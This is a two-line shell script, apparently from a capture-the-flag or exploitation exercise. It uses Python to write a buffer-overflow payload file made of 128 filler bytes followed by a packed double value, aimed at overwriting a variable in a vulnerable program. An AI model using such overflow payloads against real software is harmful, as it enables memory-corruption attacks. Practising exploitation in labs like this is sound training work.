#!/bin/bash
python -c "import struct; print 'a' * 128 + struct.pack('<d', 64.33333)" > payload
